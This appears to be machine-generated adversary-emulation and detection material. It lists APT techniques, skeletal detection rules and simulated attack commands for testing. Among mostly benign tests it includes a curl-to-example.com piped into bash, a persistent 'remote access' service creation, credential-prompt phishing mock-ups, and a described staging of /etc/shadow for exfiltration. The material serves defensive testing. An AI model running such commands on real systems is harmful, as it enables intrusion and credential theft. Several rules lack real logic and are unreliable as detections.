extracted_ttps.description: Asian APT groups use command and scripting interpreters like 'at', 'net', 'ping', 'reg', and 'sc' to execute commands
Use of command line tools like 'at', 'net', 'ping', 'reg', 'sc' for execution
Use of command line tools like 'at', 'net', 'ping', 'reg', 'sc' for execution
Asian APT groups may use remote services to gain initial access to a network
Asian APT groups use phishing campaigns to trick victims into divulging sensitive information
Use of malware for automated data collection
Asian APT groups exploit vulnerabilities in public-facing applications to gain initial access
Asian APT groups may use user execution to run malware or implants
Use of user-initiated actions to execute malicious code, potentially through social engineering
Use of social engineering to trick users into executing malware
Detected Exploit Public-Facing Application activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching
Detected Phishing activity via NLP pattern matching

rules.title: Command and Scripting Interpreter Detection
rules.description: Detects the use of command and scripting interpreters like 'at', 'net', 'ping', 'reg', and 'sc' to execute commands, a technique used by Asian APT groups
falsepositives: Scheduled tasks executed by the system

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Remote Services Detection
rules.description: Detects potential use of remote services by Asian APT groups for initial access
falsepositives: Legitimate administrative use of sc.exe or psexec.exe for service management

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Detection: Phishing
rules.description: Asian APT groups use phishing campaigns to trick victims into divulging sensitive information

rules.title: Automated Collection via Malware
rules.description: Detects automated data collection using malware

rules.title: Exploit Public-Facing Application
rules.description: Detects exploitation of public-facing applications by Asian APT groups to gain initial access
falsepositives: Legitimate web traffic from internal networks

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Detection: User Execution
rules.description: Asian APT groups may use user execution to run malware or implants

rules.title: Archive Collected Data Detection
rules.description: Detects Archive Collected Data activity via NLP pattern matching
falsepositives: Legitimate archiving activity by system administrators

attacks.description: Add a new user to the system using the net user command
attacks.expected_behavior: A new user will be added to the system with the specified username and password

attacks.description: Create a new service using the sc create command
attacks.expected_behavior: A new service will be created with the specified binary path

attacks.description: Use powershell to get a list of processes with names like 'svchost'
attacks.expected_behavior: A list of processes with names like 'svchost' will be displayed

attacks.description: Basic command to create a file using bash
attacks.expected_behavior: Creates a file named test.txt in the /tmp directory with the content 'Hello World'

attacks.description: Intermediate command to ping a website and suppress output
attacks.expected_behavior: Pings google.com once and suppresses the output

attacks.description: Advanced command to create a file in the root directory using sudo
attacks.expected_behavior: Creates a file named test.txt in the /root directory with the content 'Hello World' using elevated privileges

attacks.description: Start the Remote Desktop Service to enable remote connections
attacks.expected_behavior: The Remote Desktop Service will be started, allowing for remote connections.

attacks.command: sc create MyRemoteService binPath= "C:\\Windows\\System32\\svchost.exe -k netsvcs" start= auto
attacks.description: Create a new service named MyRemoteService that can be used for remote access
attacks.expected_behavior: A new service named MyRemoteService will be created and configured to start automatically.

attacks.description: Use PowerShell to download a remote file, simulating a remote service call
attacks.expected_behavior: A file named remote.txt will be downloaded from the specified URL and saved to the TEMP directory.

attacks.description: Basic remote service usage to create a directory and file on a remote host
attacks.expected_behavior: Creates a directory and file on the remote host

attacks.description: Intermediate remote service usage to download a file from a remote location
attacks.expected_behavior: Downloads a file from a remote location to the remote host

attacks.description: Advanced remote service usage to download and execute a script
attacks.expected_behavior: Downloads and executes a script on the remote host

attacks.command: powershell -Command "echo 'Please enter your credentials: ' > %TEMP%\phish.txt; echo 'Username: ' >> %TEMP%\phish.txt; echo 'Password: ' >> %TEMP%\phish.txt; notepad %TEMP%\phish.txt"
attacks.description: Create a phishing text file and open it in Notepad to simulate a phishing email
attacks.expected_behavior: A text file will be created in the Temp directory, and Notepad will open to display the file, simulating a phishing email

attacks.command: cmd.exe /c echo Please enter your credentials: > %TEMP%\phish.txt && echo Username: >> %TEMP%\phish.txt && echo Password: >> %TEMP%\phish.txt && start %TEMP%\phish.txt
attacks.description: Create a phishing text file and open it in the default text editor to simulate a phishing email
attacks.expected_behavior: A text file will be created in the Temp directory, and the default text editor will open to display the file, simulating a phishing email

attacks.command: powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $form = New-Object System.Windows.Forms.Form; $form.Text = 'Phishing Form'; $label = New-Object System.Windows.Forms.Label; $label.Text = 'Please enter your credentials:'; $form.Controls.Add($label); $form.ShowDialog()"
attacks.description: Create a phishing form using Windows Forms to simulate a phishing email
attacks.expected_behavior: A form will be displayed with a label asking for credentials, simulating a phishing email

attacks.description: Create a file that could be used in a phishing attempt to trick users into entering their credentials.
attacks.expected_behavior: A file named phishing_attempt.txt will be created in the current directory with the content 'Please enter your credentials'.

attacks.command: mkdir phishing_campaign && echo 'You have been phished' > phishing_campaign/readme.txt
attacks.description: Create a directory and a file within it that could be part of a phishing campaign, simulating the creation of malicious content.
attacks.expected_behavior: A directory named phishing_campaign will be created in the current directory, containing a file named readme.txt with the content 'You have been phished'.

attacks.description: Copy a system file to create a template for a phishing email, demonstrating how attackers might use system information in their campaigns.
attacks.expected_behavior: A copy of the /etc/issue file will be created in the current directory, named phishing_email_template.txt, which could be used as a template for crafting phishing emails.

attacks.description: Collects the content of all .txt files in the temporary directory and saves it to a new file named collected_data.txt
attacks.expected_behavior: The command collects text file contents from the temp directory and stores them in a new file without requiring admin privileges.

attacks.description: Collects the content of all .log files in the temporary directory and appends it to a new file named log_collection.log
attacks.expected_behavior: The command collects log file contents from the temp directory and appends them to a new log file without requiring admin privileges.

attacks.description: Compresses all files in the temporary directory into a zip archive named collected_data.zip, overwriting any existing file with the same name
attacks.expected_behavior: The command compresses all files in the temp directory into a zip archive, potentially overwriting existing files without requiring admin privileges.

attacks.description: This command finds all .txt files in the /home/user directory and creates a tarball of them in /tmp, simulating data collection.
attacks.expected_behavior: Creates a tarball of .txt files in /tmp/collected_data.tar.gz without requiring admin privileges.

attacks.description: This command creates a tarball of sensitive system files (/etc/passwd and /etc/shadow) and then encodes it in base64, simulating data preparation for exfiltration.
attacks.expected_behavior: Creates a base64 encoded string of a tarball containing sensitive system files in /tmp/sensitive_data.base64, requiring admin privileges.

attacks.description: This command finds all files in the /home directory, logs their paths, and appends their contents to a log file, simulating automated data collection.
attacks.expected_behavior: Creates log files in /tmp containing file paths and contents without requiring admin privileges.

attacks.description: Simulate exploiting a public-facing application by downloading a benign file from a local web server using certutil.exe
attacks.expected_behavior: Downloads a benign file from a local web server to the temporary directory

attacks.description: Simulate exploiting a public-facing application by downloading a benign file from a local web server using PowerShell
attacks.expected_behavior: Downloads a benign file from a local web server to the temporary directory using PowerShell

attacks.description: Simulate exploiting a public-facing application by creating and executing a benign file using cmd.exe
attacks.expected_behavior: Creates a benign file in the temporary directory and executes it using cmd.exe

attacks.description: Simulate exploiting a vulnerability in a public-facing application using curl and execute a benign payload using bash
attacks.expected_behavior: The command will send a GET request to the vulnerable application and execute a benign payload using bash

attacks.description: Simulate downloading and executing a malicious payload using wget and bash
attacks.expected_behavior: The command will download a benign payload and execute it using bash

attacks.command: curl -X POST -H 'Content-Type: application/json' -d '{"exploit": true}' http://example.com/vuln_app | bash
attacks.description: Simulate exploiting a vulnerability in a public-facing application using curl and execute a benign payload using bash
attacks.expected_behavior: The command will send a POST request to the vulnerable application and execute a benign payload using bash

attacks.description: Downloads a file from a URL and executes it
attacks.expected_behavior: Downloads a file and executes it, potentially running malware

attacks.description: Executes a PowerShell script from the temp directory
attacks.expected_behavior: Executes a PowerShell script, potentially running malicious code

attacks.description: Executes a benign command to test user execution
attacks.expected_behavior: Opens notepad, demonstrating user execution

attacks.description: Basic user execution of a malicious script
attacks.expected_behavior: The command executes a script named 'malicious_script.sh' located in the /tmp directory, simulating user execution of potentially malicious code.

attacks.description: Intermediate execution of malicious Python code
attacks.expected_behavior: This command executes a Python script named 'malicious_code.py' located in the user's home directory, demonstrating how a user might run malicious code written in Python.

attacks.description: Advanced scenario involving creation and execution of a malicious file with elevated privileges
attacks.expected_behavior: This command sequence creates a new file named 'malicious_file.sh' in the /tmp directory, makes it executable, and then executes it with elevated privileges, simulating a sophisticated user execution attack that requires admin privileges.

attacks.description: Archives a test file using makecab.exe
attacks.expected_behavior: Creates an archive file named archive.cab in the Documents folder containing test.txt

attacks.description: Archives a test file using PowerShell's Compress-Archive cmdlet
attacks.expected_behavior: Creates a zip archive named archive.zip in the user's temporary directory containing test.txt

attacks.command: cmd.exe /c "cd %TEMP% && echo Test Data > test.txt && makecab.exe test.txt archive.cab"
attacks.description: Creates a test file, then archives it using makecab.exe via cmd.exe
attacks.expected_behavior: Creates a test file in the temporary directory, then archives it into an archive.cab file

attacks.description: This command collects data from a specified directory and archives it using tar, compressing the archive with gzip.
attacks.expected_behavior: The command creates a compressed archive named 'collected_data.tar.gz' in the current directory, containing all files from '/path/to/target/directory'.

attacks.description: This command uses 'find' to search for files in the target directory and pipes the results to 'tar' for archiving, demonstrating a more complex scenario where specific files are targeted.
attacks.expected_behavior: The command creates a compressed archive containing all files found by 'find' in '/path/to/target/directory', using 'tar' with the '--null' option to safely handle file names.
